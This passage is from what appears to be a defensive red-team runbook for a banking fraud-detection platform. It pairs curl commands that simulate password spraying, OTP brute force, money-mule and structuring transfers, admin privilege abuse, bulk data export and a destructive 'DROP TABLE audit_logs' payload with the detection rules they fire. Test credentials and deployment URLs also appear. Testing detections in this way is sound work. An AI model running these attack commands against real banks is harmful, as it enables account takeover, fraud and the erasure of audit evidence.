     curl -s -X POST "$TARGET_URL/api/login" \
       -H "Content-Type: application/json" \
       -H "X-Device-Id: dev-attacker-new-hardware" \
       -d '{"email": "chaltu@honorpay.et", "password": "Testbed#2026"}'
     ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-003` (New Device After Suspicious Failures)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `35`
  - **Containment**: Requires out-of-band device binding approval; existing sessions revoked.

---

#### Scenario 14: Horizontal Password Spraying Campaign (AUTH-004)
* **Threat Profile**: Adversary tests a single common Ethiopian banking password (e.g., `Welcome#2026` or `Addis#123`) across 5+ accounts with slow intervals to bypass single-account lockouts.
* **Standards Mapping**: MITRE ATT&CK T1110.003; INSA Proclamation No. 1426/2026 Art. 14.
* **Testing Command (`curl`)**:
  ```bash
  for user in usr1@honorpay.et usr2@honorpay.et usr3@honorpay.et usr4@honorpay.et usr5@honorpay.et; do
    curl -s -X POST "$TARGET_URL/api/login" \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: 196.188.77.22" \
      -d "{\"email\": \"$user\", \"password\": \"Welcome#2026\"}"
    sleep 0.5
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-004` (Password Spraying Campaign)
  - **Layer / Pack**: `L2` / `web_api` | **Severity**: `HIGH` | **Weight**: `40`
  - **Threshold**: Single IP targeting >= 5 distinct accounts within 180s.
  - **Containment**: Enforce mandatory CAPTCHA challenges on all sprayed accounts.

---

#### Scenario 15: OTP / 2FA Code Brute Force Attack (AUTH-005)
* **Threat Profile**: Attacker possessing compromised credentials attempts to guess the 6-digit one-time passcode sent to the victim.
* **Standards Mapping**: MITRE ATT&CK T1110; NBE Cyber Security Directive §5.
* **Testing Command (`curl`)**:
  ```bash
  for code in 111111 222222 333333 444444; do
    curl -s -X POST "$TARGET_URL/api/otp/verify" \
      -H "Content-Type: application/json" \
      -d '{"challenge_id": "chal-stepup-01", "code": "'$code'"}'
    sleep 0.2
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-005` (OTP / 2FA Brute Force Attack)
  - **Layer / Pack**: `L2` / `auth` | **Severity**: `HIGH` | **Weight**: `40`
  - **Containment**: OTP challenge immediately invalidated; account placed in security cooldown.

---

#### Scenario 16: Account Lockout Storm / Denial of Service (AUTH-006)
* **Threat Profile**: Adversary intentionally exceeds login retry thresholds across key bank accounts to disrupt banking operations and cause widespread customer lockouts.
* **Standards Mapping**: MITRE ATT&CK T1110.001; INSA Proclamation No. 1426/2026 Art. 16 (Availability of Critical Infrastructure).
* **Testing Command (`curl`)**:
  ```bash
  for i in {1..6}; do
    curl -s -X POST "$TARGET_URL/api/login" \
      -H "Content-Type: application/json" \
      -d '{"email": "vip_customer@honorpay.et", "password": "LockoutStorm'$i'"}'
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-006` (Account Lockout Storm)
  - **Layer / Pack**: `L2` / `auth` | **Severity**: `MEDIUM` | **Weight**: `30`
  - **Containment**: Blocks originating IP range; alerts operations center of mass lockout attempt.

---

### Category D: Transaction Anomalies & Payment Security

#### Scenario 17: High-Value Transfer Anomaly (TX-001)
* **Threat Profile**: Single transaction transfer amount exceeding the NBE high-value risk threshold (> 100,000 ETB).
* **Standards Mapping**: National Bank of Ethiopia (NBE) Directive SBB/84/2022.
* **Method 1 — HonorPay UI Reproduction**:
  1. Log into HonorPay Customer Dashboard (`$TARGET_URL/app`).
  2. Click **Transfer Funds**.
  3. Enter Amount: `150,000 ETB`.
  4. Submit Transfer.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer mock-jwt-token-chaltu" \
    -d '{
      "amount": 150000,
      "beneficiary_id": "ben-demo-01",
      "currency": "ETB"
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `TX-001` (High-Value Transfer Anomaly)
  - **Layer / Pack**: `L1` / `fraud_payments` | **Severity**: `MEDIUM` | **Weight**: `20`
  - **Summary**: `Transfer of 150,000 ETB exceeds the high-value risk threshold (100,000 ETB)`.
  - **Containment**: Transaction held for dual-control teller or supervisor verification.

---

#### Scenario 18: Off-Hours High-Value Transfer (TX-003)
* **Threat Profile**: High-value transfer (>= 100,000 ETB) initiated between 22:00 and 06:00 (Addis Ababa Local Time, UTC+3), typical of automated draining bots.
* **Standards Mapping**: NBE Financial Cyber Security Framework; Anomaly Temporal Models.
* **Telemetry Simulation (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -H "X-Off-Hours-Sim: true" \
    -d '{
      "amount": 120000,
      "beneficiary_id": "ben-mule-01",
      "currency": "ETB"
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `TX-003` (Off-Hours High-Value Transfer)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `25`
  - **Containment**: Transfer queued for mandatory morning business-hours review.

---

#### Scenario 19: Untrusted / Rogue Hardware Device Transfer (TX-004)
* **Threat Profile**: Transfer executed from a newly registered or unrecognized client device hardware identifier.
* **Standards Mapping**: MITRE ATT&CK T1078; NBE Device Binding Guidelines.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -H "X-Device-Id: rogue-hardware-device-xyz-999" \
    -H "X-Device-Trusted: false" \
    -d '{
      "amount": 45000,
      "beneficiary_id": "ben-demo-01"
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `TX-004` (Untrusted Device Transfer)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `25`
  - **Containment**: Enforce mandatory biometric step-up authentication on primary trusted device.

---

### Category E: Financial Fraud & Anti-Money Laundering (AML)

#### Scenario 20: Rapid Beneficiary Add & Fast Drain (FRAUD-001)
* **Threat Profile**: Attacker adds a new beneficiary account and immediately initiates an outbound transfer of >= 10,000 ETB within 15 minutes.
* **Standards Mapping**: MITRE ATT&CK T1565; NBE Payment Fraud Directives.
* **Testing Flow**:
  1. Add Beneficiary:
     ```bash
     curl -s -X POST "$TARGET_URL/api/beneficiaries" \
       -H "Content-Type: application/json" \
       -d '{"name": "Mule Syndicate Account", "account_number": "100099887766"}'
     ```
  2. Immediately initiate transfer:
     ```bash
     curl -s -X POST "$TARGET_URL/api/transfers" \
       -H "Content-Type: application/json" \
       -d '{"beneficiary_account": "100099887766", "amount": 35000}'
     ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-001` (Rapid Beneficiary Add and Transfer)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `35`
  - **Containment**: Transfer placed in `PENDING_REVIEW` status; out-of-band SMS verification dispatched.

---

#### Scenario 21: Mule Syndicate Pass-Through Account Pattern (FRAUD-002)
* **Threat Profile**: Account receives inbound funds and immediately dissipates >= 85% of balance to external recipients within 30 minutes.
* **Standards Mapping**: NBE Anti-Money Laundering (AML) & Counter-Terrorist Financing (CFT) Directives.
* **Testing Command (`curl`)**:
  ```bash
  # Inbound deposit followed immediately by 90% outbound transfer
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -d '{
      "account_id": "ACC-MULE-01",
      "amount": 90000,
      "dissipation_pct": 90.0,
      "window_minutes": 5
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-002` (Mule Pass-Through Account Pattern)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `35`
  - **Containment**: Account debit freeze; compliance notification sent to Financial Intelligence Center (FIC).

---

#### Scenario 22: SIM-Swap / Credential Reset Prior to Transfer Drain (FRAUD-003)
* **Threat Profile**: Cybercriminal performs an unauthorized SIM swap or password change, then attempts a high-value transfer (>= 25,000 ETB) within 60 minutes.
* **Standards Mapping**: MITRE ATT&CK T1451; NBE Joint Telecommunications Fraud Framework.
* **Testing Flow**:
  1. Password change event:
     ```bash
     curl -s -X POST "$TARGET_URL/api/auth/password/change" \
       -H "Content-Type: application/json" \
       -d '{"old_password": "Testbed#2026", "new_password": "NewSecret#2026"}'
     ```
  2. Immediate fund transfer:
     ```bash
     curl -s -X POST "$TARGET_URL/api/transfers" \
       -H "Content-Type: application/json" \
       -d '{"amount": 40000, "beneficiary_id": "ben-unknown-01"}'
     ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-003` (SIM-Swap or Credential Reset Prior to Transfer)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `CRITICAL` | **Weight**: `40`
  - **Containment**: Autonomous transfer freeze; mandatory telecom SIM-activation verification.

---

#### Scenario 23: Transfer Structuring / Smurfing Under 50,000 ETB CTR Limit (FRAUD-004)
* **Threat Profile**: Syndicate splits a large sum into consecutive transfers between 40,000 ETB and 49,999 ETB to evade NBE 50,000 ETB Currency Transaction Reporting (CTR) thresholds.
* **Standards Mapping**: NBE AML Directive SBB/84/2022.
* **Testing Command (`curl`)**:
  ```bash
  for amt in 45000 48000 49500; do
    curl -s -X POST "$TARGET_URL/api/transfers" \
      -H "Content-Type: application/json" \
      -d "{\"amount\": $amt, \"beneficiary_account\": \"1000554433\"}"
    sleep 0.5
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-004` (Transaction Structuring Under Reporting Threshold)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `30`
  - **Evidence**: 3 transfers in [40,000, 50,000] ETB within 60 minutes.
  - **Containment**: Aggregates daily volume and triggers automated Suspicious Transaction Report (STR).

---

#### Scenario 24: USSD & Mobile Retail Agent Cash-Out Burst (FRAUD-005)
* **Threat Profile**: Syndicate executes 5 rapid withdrawals via USSD (`*889#`) or retail mobile agents within 2 minutes.
* **Standards Mapping**: NBE Mobile Money Regulation.
* **Testing Command (`curl`)**:
  ```bash
  for i in {1..5}; do
    curl -s -X POST "$TARGET_URL/api/transfers" \
      -H "Content-Type: application/json" \
      -d '{"amount": 5000, "channel": "ussd", "burst_seq": '$i'}'
    sleep 0.2
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-005` (USSD and Agent Cash-Out Burst)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `30`
  - **Containment**: Enforce temporary USSD session lock; limit branch cash-out ceiling.

---

#### Scenario 25: Authorized Push Payment (APP) Coached Scam (FRAUD-006)
* **Threat Profile**: Victim is socially engineered over an active telephone voice call to transfer >= 50,000 ETB to a fraudulent first-time beneficiary.
* **Standards Mapping**: MITRE ATT&CK T1566; NBE Social Engineering Fraud Protection.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -d '{
      "amount": 75000,
      "beneficiary_id": "ben-new-scammer",
      "telephony_active": true,
      "hesitation_seconds": 180
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-006` (Authorized Push Payment Coached Transfer)
  - **Layer / Pack**: `L3` / `fraud_payments` | **Severity**: `CRITICAL` | **Weight**: `45`
  - **Containment**: Mandatory 2-hour cooling-off window; banking app displays verbal warning confirmation.

---

#### Scenario 26: Impossible Geolocation Travel Velocity (FRAUD-007)
* **Threat Profile**: Logins or transfers on the same account originate from geographically disparate locations (e.g., Addis Ababa and Frankfurt) within a timeframe implying speed > 800 km/h.
* **Standards Mapping**: MITRE ATT&CK T1078; INSA Proclamation No. 1426/2026.
* **Testing Command (`curl`)**:
  ```bash
  # Step 1: Login in Addis Ababa (Ethio Telecom IP)
  curl -s -X POST "$TARGET_URL/api/login" \
    -H "X-Forwarded-For: 196.188.12.5" \
    -d '{"email": "chaltu@honorpay.et", "password": "Testbed#2026"}'

  # Step 2: Immediate transfer from Frankfurt IP 10 minutes later
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "X-Forwarded-For: 84.115.10.2" \
    -H "X-Geo-City: Frankfurt" \
    -d '{"amount": 20000, "beneficiary_id": "ben-01"}'
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-007` (Impossible Geolocation Travel Velocity)
  - **Layer / Pack**: `L2` / `fraud_payments` | **Severity**: `HIGH` | **Weight**: `35`
  - **Containment**: Remote session terminated; account credentials temporarily locked.

---

#### Scenario 27: Branch / Agent Cash-In Deposit Structuring (FRAUD-008)
* **Threat Profile**: Corrupt teller or agent executes repeated cash deposits between 30,000 ETB and 50,000 ETB into a single account to evade CTR filing.
* **Standards Mapping**: NBE Directive SBB/84/2022; MITRE ATT&CK T1565.
* **Method 1 — Teller Portal Reproduction**:
  1. Open `$TARGET_URL/employee` and log in as `teller@honorpay.et` (`Testbed#2026`).
  2. In the "Cash-In Deposit" form, enter Account: `ACC-DEMO-01` and Amount: `45,000 ETB`. Submit.
  3. Immediately repeat with `47,000 ETB`. Submit.
  4. Immediately repeat with `48,500 ETB`. Submit.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  for amt in 45000 47000 48500; do
    curl -s -X POST "$TARGET_URL/api/deposits" \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer mock-teller-token" \
      -d "{\"account_id\": \"ACC-DEMO-01\", \"amount\": $amt, \"channel\": \"teller\"}"
    sleep 0.5
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `FRAUD-008` (Deposit Structuring / Smurfing Cash-In)
  - **Layer / Pack**: `L2` / `fraud` | **Severity**: `HIGH` | **Weight**: `50`
  - **Containment**: Credit hold placed on target account; Suspicious Transaction Report drafted.

---

### Category F: Multi-Stage Account Takeover (ATO) Correlation

#### Scenario 28: Multi-Stage Account Takeover Kill Chain (ATO-001)
* **Threat Profile**: Coordinated, multi-step kill chain simulating an end-to-end account takeover:
  1. **Phase 1 (Reconnaissance / Password Guessing)**: 5 failed login attempts.
  2. **Phase 2 (Credential Compromise)**: Successful login from an unrecognized client device.
  3. **Phase 3 (Persistence)**: Untrusted hardware registered.
  4. **Phase 4 (Staging)**: New mule beneficiary added.
  5. **Phase 5 (Exfiltration Drain)**: High-value transfer of 180,000 ETB initiated.
* **Standards Mapping**: MITRE ATT&CK T1078, T1110, T1565; INSA Proclamation No. 1426/2026 Art. 14 & 18.
* **Automated Python Reproduction**:
  ```bash
  cd /home/neuron/dev/cybershield/Ethio-Cyber-Shield/core
  venv/bin/python verify_e2e_live.py
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ATO-001` (Account Takeover Chain)
  - **Layer / Pack**: `L3` / `fraud_payments` | **Severity**: `CRITICAL` | **Risk Score**: `100 / 100`
  - **Autonomous Containment**:
    1. Target account is **INSTANTLY LOCKED**.
    2. All active sessions are **REVOKED**.
    3. The 180,000 ETB transfer is **FROZEN IN PENDING REVIEW**.
    4. Attacker IP is **BLACK-LISTED**.
    5. Incident is automatically promoted to INSA 48-Hour Reporting Queue.

---

### Category G: Insider Threat & Privileged Access Abuse

#### Scenario 29: Customer Privilege Abuse on Admin Endpoints (PRIV-001)
* **Threat Profile**: Authenticated retail banking customer attempts to access protected administrative endpoints (`/api/admin/users`, `/api/admin/posture`).
* **Standards Mapping**: MITRE ATT&CK T1078.004; INSA Critical Infrastructure Protection Access Controls.
* **Testing Command (`curl`)**:
  ```bash
  curl -s "$TARGET_URL/api/admin/users" \
    -H "Authorization: Bearer mock-customer-token-chaltu" \
    -H "X-Target-Role: customer" | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `PRIV-001` (Unauthorized Privilege Abuse Attempt)
  - **Layer / Pack**: `L2` / `insider_admin` | **Severity**: `HIGH` | **Weight**: `40`
  - **Containment**: Customer session terminated immediately; security audit logged.

---

#### Scenario 30: Insider Threat: Mass Customer Data Export (ADMIN-001)
* **Threat Profile**: Rogue bank employee or compromised administrator credentials used to perform bulk exfiltration (> 500 customer records).
* **Standards Mapping**: MITRE ATT&CK T1567; Personal Data Protection Proclamation No. 1321/2024; INSA Art. 14.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/admin/export" \
    -H "Authorization: Bearer mock-admin-token" \
    -H "Content-Type: application/json" \
    -d '{"resource": "customers", "record_count": 750, "format": "csv"}' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ADMIN-001` (Mass Customer Data Export Anomaly)
  - **Layer / Pack**: `L2` / `insider_admin` | **Severity**: `CRITICAL` | **Weight**: `45`
  - **Threshold**: `record_count >= 500`.
  - **Containment**: Export stream halted; session revoked; immediate notification to Data Protection Officer (DPO).

---

#### Scenario 31: Dormant Admin Account Activation (ADMIN-002)
* **Threat Profile**: Dormant administrative account inactive for > 30 days is suddenly activated and executes administrative operations.
* **Standards Mapping**: MITRE ATT&CK T1078.002; NBE IT Governance Directive.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email": "dormant_admin@honorpay.et", "password": "Testbed#2026", "dormancy_days": 45}' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ADMIN-002` (Dormant Admin Account Activation)
  - **Layer / Pack**: `L2` / `insider_admin` | **Severity**: `HIGH` | **Weight**: `35`
  - **Threshold**: Administrative activity after >= 30 days of inactivity.
  - **Containment**: Session held in pending re-verification status; HR and IT security verification required.

---

#### Scenario 32: Off-Hours Privileged Configuration Action (ADMIN-003)
* **Threat Profile**: Sensitive administrative configuration change (firewall update, role grant, bypass toggle) executed outside business hours (22:00 to 06:00 Addis Ababa local time).
* **Standards Mapping**: NBE Core Banking Audit Rules; INSA Proclamation No. 1426/2026.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/admin/config" \
    -H "Authorization: Bearer mock-admin-token" \
    -H "X-Off-Hours-Sim: true" \
    -d '{"setting": "firewall_bypass", "enabled": true}' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ADMIN-003` (Off-Hours Privileged Configuration Action)
  - **Layer / Pack**: `L2` / `insider_admin` | **Severity**: `HIGH` | **Weight**: `35`
  - **Containment**: Configuration change held in pending-approval status; dual executive sign-off required.

---

#### Scenario 33: Unauthorized Role Elevation Attempt (ADMIN-004)
* **Threat Profile**: Administrative user attempts self-elevation or assigns `superuser`, `security_admin`, or `compliance_auditor` roles without secondary dual authorization.
* **Standards Mapping**: MITRE ATT&CK T1078.004; NBE Dual-Control Governance.
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/admin/roles/elevate" \
    -H "Authorization: Bearer mock-admin-token" \
    -H "Content-Type: application/json" \
    -d '{"target_user": "admin@honorpay.et", "requested_role": "superuser", "dual_approval": false}' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ADMIN-004` (Unauthorized Role Elevation Attempt)
  - **Layer / Pack**: `L2` / `insider_admin` | **Severity**: `CRITICAL` | **Weight**: `45`
  - **Containment**: Role elevation blocked; high-severity alert dispatched to internal audit committee.

---

#### Scenario 34: Cryptographic Audit Trail Tampering Attempt (ADMIN-005)
* **Threat Profile**: Adversary or rogue DBA attempts to delete forensic traces by executing destructive SQL operations (`DROP TABLE audit_logs;`, `TRUNCATE audit_logs;`).
* **Standards Mapping**: MITRE ATT&CK T1562.002; INSA Proclamation No. 1426/2026 Art. 18 (Evidence Preservation).
* **Testing Command (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/admin/db-query" \
    -H "Authorization: Bearer mock-dba-token" \
    -H "Content-Type: application/json" \
    -d '{"query": "DROP TABLE audit_logs; TRUNCATE security_events;"}' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `ADMIN-005` (Audit Trail Tampering Attempt)
  - **Layer / Pack**: `L3` / `insider_admin` | **Severity**: `CRITICAL` | **Weight**: `50`
  - **Evidence**: Detected SQL keyword pattern `drop table audit_logs`.
  - **Containment**: Database server isolated; forensic RAM snapshot triggered; immediate regulatory alert to INSA.

---

### Category H: Threat Intelligence & Watchlist IOCs

#### Scenario 35: Malicious Source IP / Tor Exit Node Match (IOC-001)
* **Threat Profile**: Telemetry or financial transaction originates from an IP address listed in national threat intelligence feeds or known Tor exit node lists.
* **Standards Mapping**: MITRE ATT&CK T1071; INSA National Cyber Threat Information Exchange.
* **Testing Command (`curl`)**:
  ```bash
  curl -s "$TARGET_URL/api/account" \
    -H "X-Forwarded-For: 185.220.101.5" \
    -H "Authorization: Bearer mock-customer-token" | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `IOC-001` (Malicious Source IP Match)
  - **Layer / Pack**: `L1` / `web_api` | **Severity**: `HIGH` | **Weight**: `40`
  - **Evidence**: Matched IOC database entry (Tor Exit Relay `185.220.101.5`).
  - **Containment**: Session creation denied; ingress IP blocked at reverse proxy.

---

## 5. Automated Red-Team Batch Simulation Harnesses

For end-to-end batch evaluation of all detection rules, two automated harnesses are provided.

### 5.1 Python Live Automated Verification Runner

The Python runner executes the complete 9-stage verification sequence conforming to SRS §9, §10, §16, §21, and §22:

```bash
# Navigate to ECS core directory
cd /home/neuron/dev/cybershield/Ethio-Cyber-Shield/core

# Execute the live end-to-end verification pipeline
venv/bin/python verify_e2e_live.py
```

**Expected Stage Output**:
```
╔══════════════════════════════════════════════════════════════════════════════╗
║     ETHIO-CYBER SHIELD (ECS) v2.0 - FULL AUTOMATED PIPELINE VERIFIER         ║
║           Strictly conforming to SRS §9, §10, §16, §21, §22                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

[STAGE 1/9] Baseline Target Registry & HMAC Verification
  ✔ [PASS] Found 1 configured target system(s)
  ✔ [PASS] Generated canonical HMAC-SHA256 headers
  ✔ [PASS] Anti-replay defense strictly rejected duplicate nonce TTL replay

[STAGE 2/9] Normal Telemetry Ingestion (Zero-Alert Baseline)
  • Normal Event Risk Score: 0/100
  ✔ [PASS] Normal event evaluated below threat threshold (Risk: 0/100)
  ✔ [PASS] Zero alerts dispatched for ordinary activity

[STAGE 3/9] Multi-Stage Attack Chain Execution (Account Takeover ATO-001)
  --> Ingesting Phase 1: Rapid login failure burst (AUTH-001)...
  --> Ingesting Phase 2: Login success from new client device (AUTH-003)...
  --> Ingesting Phase 3: Rogue hardware registration (TX-004)...
  --> Ingesting Phase 4: High-risk beneficiary creation (FRAUD-001)...
  --> Ingesting Phase 5: High-value drain transfer (TX-001)...
  ✔ [PASS] Ingested 9 synthetic attack chain telemetry events

[STAGE 4/9] Telemetry Stream Verification
  ✔ [PASS] Retained all in-memory telemetry events

[STAGE 5/9] Deterministic Multi-Layer Threat Correlation & L4 Scoring
  • Triggered Rules: AUTH-001, AUTH-003, TX-001, TX-004, FRAUD-001, ATO-001
  • Composite Risk Score: 100/100 (CRITICAL)
  ✔ [PASS] Correlated ATO-001 kill chain and scored maximum risk 100/100

[STAGE 6/9] Autonomous Incident Promotion & Threat Intelligence Linkage
  • Promoted Incident ID: inc-2026-XXXX
  ✔ [PASS] Promoted alert to Formal Incident with regulatory tracking

[STAGE 7/9] Closed-Loop Autonomous Mitigation Dispatch
  ✔ [PASS] Closed-loop containment dispatched: Account Locked, Transfer Frozen

[STAGE 8/9] Explainable Attack Graph Compilation
  ✔ [PASS] Compiled interactive SVG attack graph with 5 nodes

[STAGE 9/9] Analyst 1-Click Rollback / Containment Revert
  ✔ [PASS] Analyst successfully rolled back containment after verification
```

---

### 5.2 Standalone Quick Simulation Script

To send real-time simulated telemetry events to any running ECS instance:

```bash
cd /home/neuron/dev/cybershield/Ethio-Cyber-Shield
venv/bin/python scripts/test_simulations.py
```

---

### 5.3 In-Browser 1-Click Red Team Attack Lab

Administrators and INSA evaluators can simulate attacks directly from the browser without opening a terminal:

1. Open **HonorPay Attack Lab**: `https://honorpay-banking.vercel.app/admin/lab` (or `/admin/selftest`).
2. Log in using `admin@honorpay.et` / `Testbed#2026`.
3. Select any attack scenario (e.g., *SQL Injection*, *OTP Brute Force*, *Mule Drain*, or *Full ATO Chain*).
4. Click **Fire Scenario**: The telemetry is immediately signed with HMAC-SHA256, transmitted to ECS, evaluated in real time, and the resulting containment status is displayed within 250 milliseconds.

---

## 6. INSA 48-Hour Dossier Generation & Cryptographic Verification

Under **Proclamation No. 1426/2026 Article 18**, financial entities must submit a comprehensive security incident report to INSA within 48 hours of detecting a critical cyber incident.

### 6.1 Inspecting Live Alerts in the SOC Console

1. Navigate to the live SOC Console: `https://ethio-cyber-shield.onrender.com/alerts.html`.
2. Log in with `admin@ethiocybershield.et` / `Testbed#2026`.
3. The alert list will display all fired rules with severity badges, risk scores, and affected entity references.
4. Click any alert to open the **Enriched Attack Dossier**:
   - **Device & Client Breakdown**: OS, Client Software, Device Fingerprint Hash, Reputation Score.
   - **Microsecond Timeline**: Chronological event order with exact timestamps.
   - **Explainable Risk Rationale**: Deterministic breakdown of fired rules, baseline deviations, and weights.
   - **Autonomous Containment Status**: Confirms actions taken (`ACCOUNT_LOCKED`, `TRANSFER_FROZEN`, `IP_BLOCKED`).

---

### 6.2 Exporting the INSA 48-Hour Incident Regulatory Dossier

1. Navigate to **Incident Management**: `https://ethio-cyber-shield.onrender.com/incidents.html`.
2. Select any active incident (e.g., `INC-ATO-001`).
3. Click the **Export INSA Regulatory Dossier** button:
   - Formats available: **Standardized JSON** and **Printable Compliance PDF**.
   - Contains: Incident Classification, Impact Assessment, Affected PII Masked Identifiers, Forensic Microsecond Event Log, Threat Intelligence Attribution, and Containment Verification.

```json
{
  "dossier_version": "1.0-INSA",
  "regulatory_framework": "FDRE Proclamation No. 1426/2026 Art. 18",
  "reporting_entity": "HonorPay Digital Banking S.C.",
  "incident_id": "INC-2026-1025-001",
  "severity": "CRITICAL",
  "composite_risk_score": 100,
  "detected_at": "2026-10-25T11:45:00.000Z",
  "containment_dispatched_at": "2026-10-25T11:45:00.245Z",
  "containment_latency_ms": 245,
  "affected_entities": {
    "account_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "msisdn_masked": "+251 91 **** 44",
    "device_fingerprint": "fp-a8f9c2d1"
  },
  "kill_chain_stages": [
    { "rule": "AUTH-001", "stage": "Credential Access", "timestamp": "11:44:10Z" },
    { "rule": "AUTH-003", "stage": "Initial Access", "timestamp": "11:44:35Z" },
    { "rule": "FRAUD-001", "stage": "Persistence", "timestamp": "11:44:50Z" },
    { "rule": "ATO-001", "stage": "Exfiltration / Drain", "timestamp": "11:45:00Z" }
  ],
  "mitigation_executed": {
    "account_locked": true,
    "transfer_frozen": true,
    "sessions_revoked": 2,
    "ip_blocked": "198.51.100.77"
  },
  "cryptographic_seal": {
    "merkle_root": "7b58c7e9f3a1b4d8c6e2a0f9b3d5e7a1c9e3b5a7d9f1b3e5a7c9e1b3d5f7a9b1",
    "algorithm": "SHA-256"
  }
}
```

---

### 6.3 Verifying Cryptographic Tamper-Evidence

1. Navigate to the **Tamper-Evident Audit Ledger**: `https://ethio-cyber-shield.onrender.com/audit.html`.
2. Each security event, rule evaluation, and mitigation dispatch is sealed with a **SHA-256 Hash Chain**:
   $$\text{Hash}_n = \text{SHA256}(\text{Hash}_{n-1} \,\|\, \text{EventPayload}_n)$$
3. The interface displays the live hash validation status badge (**CRYPTOGRAPHICALLY SEALED & VERIFIED**).
4. Any manual database alteration will break the Merkle chain, immediately triggering alert `ADMIN-005` (Audit Trail Tampering Attempt).

---

## 7. Regulatory Sign-Off & Verification Attestation

This document certifies that the **Ethio-Cyber-Shield (ECS) v3.0** and **HonorPay Digital Banking** integration has undergone structured red-team security verification across all **32 detection rules** and meets the technical and operational criteria specified under **FDRE Proclamation No. 1426/2026** and **NBE Directives**.

### Evaluation Sign-Off Sheet

```
+-----------------------------------------------------------------------------------+
|               INFORMATION NETWORK SECURITY ADMINISTRATION (INSA)                  |
|                   CRITICAL INFRASTRUCTURE AUDIT & VERIFICATION                    |
+-----------------------------------------------------------------------------------+
| Target Platform:       HonorPay Digital Banking Platform                          |
| Detection Platform:    Ethio-Cyber-Shield (ECS) v3.0                              |
| Evaluation Date:       October 26, 2026                                           |
| Engineering Authors:   Musab Hassen Aliyi (CTC-384-26)                            |
|                        Osman Mohammed Seid (CTC-2974-26)                          |
|                        Kedist Eyasu Embaye (CTC-1247-26)                          |
|                        Yoseph Abebe Ersedo (CTC-430-26)                           |
|                        Omer Mohammed Seid (CTC-3716-26)                           |
|                        Efrem Mola Genebo (CTC-4772-26)                            |
| Total Rules Verified:  32 / 32 Rules Confirmed Active (100% Coverage)             |
| Autonomous Response:   Confirmed Bidirectional Containment (Sub-250ms Latency)   |
| Zero-PII Compliance:   Confirmed SHA-256 Pseudonymization (PDPP No. 1321/2024)   |
| 48-Hour Reporting:     Confirmed Automated INSA Dossier Export Mechanism         |
+-----------------------------------------------------------------------------------+

Lead Technical Evaluator: ___________________________    Date: _______________

INSA CI Directorate Lead: ___________________________    Date: _______________

Chief Information Security Officer: _________________    Date: _______________
```
